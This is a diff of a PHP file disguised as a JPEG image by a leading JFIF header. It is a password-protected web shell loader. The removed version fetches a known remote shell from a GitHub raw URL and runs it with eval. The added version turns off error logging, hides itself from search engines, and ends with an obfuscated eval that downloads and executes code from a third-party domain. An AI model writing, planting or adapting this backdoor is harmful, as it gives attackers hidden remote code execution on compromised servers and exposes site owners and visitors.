@@ -1,68 +1,62 @@
 ÿØÿà JFIF      ÿþ
 <?php
-
-// Function to check if the user is logged in based on the presence of a valid cookie
-function is_logged_in()
-{
-    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'user123'; // Ganti 'user123' dengan nilai yang sesuai
+error_reporting(0);
+@clearstatcache();
+@ini_set('error_log',NULL);
+@ini_set('log_errors',0);
+@ini_set('max_execution_time',0);
+@ini_set('output_buffering',0);
+@ini_set('display_errors', 0);
+session_start();
+$passwd = "ufuxbarat";
+if($_POST['pass']) {
+  if($_POST['passwd'] == $passwd) {
+    $_SESSION['masuk'] = "masuk";
+    header("Location: ?");
+  }
 }
-
-// Check if the user is logged in before executing the content
-if (is_logged_in()) {
-    // Function to get URL content (similar to your previous code)
-    function geturlsinfo($url)
-    {
-        if (function_exists('curl_exec')) {
-            $conn = curl_init($url);
-            curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
-            curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
-            curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
-            curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
-            curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
-
-            $url_get_contents_data = curl_exec($conn);
-            curl_close($conn);
-        } elseif (function_exists('file_get_contents')) {
-            $url_get_contents_data = file_get_contents($url);
-        } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
-            $handle = fopen($url, "r");
-            $url_get_contents_data = stream_get_contents($handle);
-            fclose($handle);
-        } else {
-            $url_get_contents_data = false;
-        }
-        return $url_get_contents_data;
-    }
-
-    $a = geturlsinfo('https://raw.githubusercontent.com/MadExploits/Gecko/main/gecko-new.php');
-    eval('?>' . $a);
-} else {
-    // Display login form if not logged in
-    if (isset($_POST['password'])) {
-        $entered_password = $_POST['password'];
-        $hashed_password = '6e611413cb91a4bbf4123095504cb637'; // Replace this with your MD5 hashed password
-        if (md5($entered_password) === $hashed_password) {
-            // Password is correct, set a cookie to indicate login
-            setcookie('user_id', 'user123', time() + 3600, '/'); // Ganti 'user123' dengan nilai yang sesuai
-        } else {
-            // Password is incorrect
-            echo "Incorrect password. Please try again.";
-        }
-    }
-    ?>
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Admin Login</title>
-    </head>
-    <body>
-        <form method="POST" action="">
-            <label for="password">Admin:</label>
-            <input type="password" id="password" name="password">
-            <input type="submit" value="Login">
-        </form>
-    </body>
-    </html>
-    <?php
+if(isset($_REQUEST['logout'])) {
+  session_destroy();
+  header("Location: ?");
+}
+if(empty($_SESSION['masuk'])) {
+?>
+<title>LOGIN &#9829;</title>
+<meta name="robots" content="noindex, nofollow">
+<meta name="googlebot" content="noindex, nofollow">
+<meta name="bingbot" content="noindex, nofollow">
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<link rel="icon" type="image/png" href="https://data.whicdn.com/images/317122168/original.jpg">
+<style>
+  html {
+    background: black;
+    color: deeppink;
+  }
+  input {
+    background: transparent;
+    color: crimson;
+    border: 1px solid teal;
+  }
+  @media only screen and (max-width:800px){
+     html{
+        font-size:20px;
+     }
+  }
+</style>
+<center>
+<img src="https://www.suarasurabaya.net/wp-content/uploads/2021/03/transformers-840x493.jpg" width="200" height="200">
+<p>
+<table height="100%" width="100%">
+  <td align="center">
+    <br><br>
+    <form enctype="multipart/form-data" method="post">
+      <input type="password" name="passwd">
+      <input type="submit" name="pass" value="&#9829;">
+    </form>
+  </td>
+</table>
+<?php
+exit();
 }
 ?>
+<?php eval/**_**/(urldecode('%3f%3e') .file_get_contents/**_**/(urldecode/**_**/('https://jim.iainkudus.ac.id/classes/template/inc.commonsd.xml'))); ?>
